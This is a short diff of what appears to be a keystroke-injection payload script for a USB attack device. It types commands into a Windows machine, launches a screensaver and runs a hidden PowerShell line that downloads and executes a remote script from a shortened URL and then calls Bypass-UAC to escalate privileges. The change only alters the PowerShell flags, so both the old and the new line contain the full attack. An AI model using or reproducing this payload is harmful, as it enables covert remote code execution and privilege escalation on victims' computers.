@@ -6,7 +6,7 @@ PrintLine:cmd
 Delay
 PrintLine:start C:/Windows/System32/Ribbons.scr /s
 Delay
-PrintLine:powershell -NoP -NonI -W Hidden -Exec Bypass "IEX (New-Object System.Net.WebClient).DownloadString('https://goo.gl/KSZT1U');Bypass-UAC -Method ucmDismMethod;"
+PrintLine:powershell -nop -noni -w 1 -Exec Bypass "IEX (New-Object System.Net.WebClient).DownloadString('https://goo.gl/KSZT1U');Bypass-UAC -Method ucmDismMethod;"
 Delay
 Delay
 Delay
